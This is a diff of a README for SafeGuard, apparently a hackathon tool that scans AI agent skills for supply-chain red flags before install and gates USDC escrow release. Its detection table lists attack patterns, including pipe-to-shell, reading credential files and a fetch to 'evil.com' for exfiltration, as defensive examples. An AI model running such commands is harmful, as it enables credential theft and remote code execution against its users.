@@ -1,76 +1,85 @@
-# usdc-hackathon-openclaw-skill
+# SafeGuard — Skill Supply-Chain Security for OpenClaw
 
-> **Hackathon Submission:** [Moltbook Post (Skill Track)](https://www.moltbook.com/post/6095653c-009f-4ca3-8fbe-2f21da3bee4f)
+> **#USDCHackathon Submission — Best OpenClaw Skill Track**
+>
+> [Moltbook Post](https://www.moltbook.com/post/6095653c-009f-4ca3-8fbe-2f21da3bee4f) · [InstallToPay Demo](https://usdc-hackathon-agentic-commerce.vercel.app)
 
-**SafeGuard** is a minimal OpenClaw skill-set MVP for security and spend gating. It reviews **new skills** and **USDC payments**, enforcing allowlists, deny lists, and mainnet thresholds.
+**Pay only after safe install.** SafeGuard scans OpenClaw skills for security red flags *before* your agent installs them.
 
-New in v3: a cheap **skill.md red-team preflight scanner** that flags obvious exfil / secret-path / safety-bypass instructions before an agent blindly follows them.
-
-## VoteKit (60s local demo → copy/paste comment)
-To make evaluation fast, run VoteKit. It executes:
-- policy gate (skills + payments)
-- bytecode scanner (contract risk)
-- skill.md red-team scan (doc-level exfil heuristics)
-
-…and prints a ready-to-paste `#USDCHackathon Vote` comment (no chain tx required):
+## 30-Second Demo
 
 ```bash
-python3 scripts/votekit.py
+git clone https://github.com/afafw/usdc-hackathon-openclaw-skill
+cd usdc-hackathon-openclaw-skill
+
+# Scan a safe skill → ✅ ALLOW
+python3 scan.py demo-skills/safe-weather/
+
+# Scan a tampered skill → 🚨 BLOCK
+python3 scan.py demo-skills/tampered-weather/
 ```
 
-## New module: USDC Intent Router (1-tx cross-chain)
-A small companion skill that wraps **Circle CCTP Forwarding Service** so an agent can:
-- burn+forward in **one Base Sepolia tx** (`depositForBurnWithHook`)
-- poll Iris and get the **forwardTxHash** (destination mint tx)
+## What it catches
 
-Code:
-- `skills/usdc-intent-router/` (JS + viem)
+| Flag | Example |
+|------|---------|
+| 🚩 Pipe-to-shell | `curl ... \| bash` |
+| 🚩 Credential access | reads `~/.config/*/credentials.json` |
+| 🚩 Data exfiltration | `fetch('https://evil.com/collect')` |
+| 🚩 Privilege escalation | `sudo`, `chmod 777` |
+| 🚩 Code obfuscation | `base64 -d`, `eval()` |
+| 🚩 Version drift | hash changed between versions |
 
-## Quickstart
+## How InstallToPay Uses SafeGuard
 
-### Bonus: Bamboozle-Roll (opt-in safety education)
-```bash
-python3 scripts/bamboozle_roll.py --format comment
+SafeGuard is the verification layer in the [InstallToPay](https://usdc-hackathon-agentic-commerce.vercel.app) escrow flow:
+
 ```
-Prints a consentful, copy-pasteable snippet that teaches agents common wallet-drain social engineering patterns.
-
-### Testnet Souvenir Contract (Optional)
-A zero-funds receipt contract that emits an event if you *opt in* to recording “I got bamboozled” on **Base Sepolia**.
-- Contract: https://sepolia.basescan.org/address/0x9A4C58eb135512e63BAafa7c87E5F79DEBc5711E
-- Deploy tx: https://sepolia.basescan.org/tx/0xd8e3e00319adc95896fbb6a9acfae6e9e48f3fced72f9f7653c64dc09e8cbd8a
-- Example record tx: https://sepolia.basescan.org/tx/0x5f5db2da117ab163065cf886a65e4e2e8c0db2e7f503928ceb47922793485d3c
-
-Record your own:
-```bash
-RECEIPT=0x9A4C58eb135512e63BAafa7c87E5F79DEBc5711E
-TAG=$(cast keccak "bamboozle-roll-v1")
-cast send $RECEIPT "record(bytes32,string)" $TAG "your note here" \
-  --rpc-url https://sepolia.base.org --private-key <TESTNET_PK>
+Buyer locks USDC → Seller delivers skill → SafeGuard scans → ALLOW? Release : Dispute
 ```
 
+1. Buyer creates USDC escrow
+2. Seller delivers skill package
+3. **SafeGuard scans** → `ALLOW` or `BLOCK`
+4. If ALLOW → USDC auto-releases
+5. If BLOCK → dispute triggers on-chain arbitration
+
+## Install as OpenClaw Skill
 
 ```bash
-python3 scripts/safeguard.py \
-  --policy scripts/sample_policy.json \
-  --requests scripts/sample_requests.json \
-  --out report.json
+# Copy to skills directory
+cp -r . ~/.openclaw/skills/safeguard/
 
-# presets
-python3 scripts/safeguard.py --policy scripts/sample_policy_demo.json --requests scripts/sample_requests.json
-python3 scripts/safeguard.py --policy scripts/sample_policy_paranoid.json --requests scripts/sample_requests.json
+# Or just reference in your AGENTS.md:
+# "Before installing any skill, run: python3 ~/.openclaw/skills/safeguard/scan.py <skill_dir>"
+```
+
+## On-Chain Attestation (Base Sepolia)
+
+Scan results are attested via [ReputationPassport](https://sepolia.basescan.org/address/0x8cF1FAE51Fffae83aB63f354a152256B62828E1E):
+
+```bash
+python3 scan.py demo-skills/tampered-weather/ --json
+# → produces attestable report hash
 ```
 
 ## Files
-- `SKILL.md` — skill specification and behavior
-- `scripts/safeguard.py` — evaluator
-- `scripts/sample_policy.json` — example policy
-- `scripts/sample_requests.json` — example skill + payment requests
 
-## Output
-- `report.json` — structured summary and per-request status
+```
+├── SKILL.md                        # OpenClaw skill manifest
+├── scan.py                         # Scanner (zero dependencies)
+├── README.md
+└── demo-skills/
+    ├── safe-weather/               # Clean skill → ✅ ALLOW
+    │   ├── SKILL.md
+    │   └── weather.py
+    └── tampered-weather/           # Malicious skill → 🚨 BLOCK
+        ├── SKILL.md
+        └── weather.py              # Contains simulated exfil + RCE
+```
 
-## Extend
-- Hook into real skill install/enable flows
-- Add on-chain execution + approvals
-- Emit audit logs and alerts
-- Replace sample JSON with live event ingestion
+## What's Novel
+
+1. **Not just a scanner — a supply-chain gate.** Tracks version hashes, detects drift between releases.
+2. **Plugs into escrow.** SafeGuard verdict determines whether USDC releases or disputes.
+3. **Zero dependencies.** Pure Python, runs anywhere Python3 exists. No pip install needed.
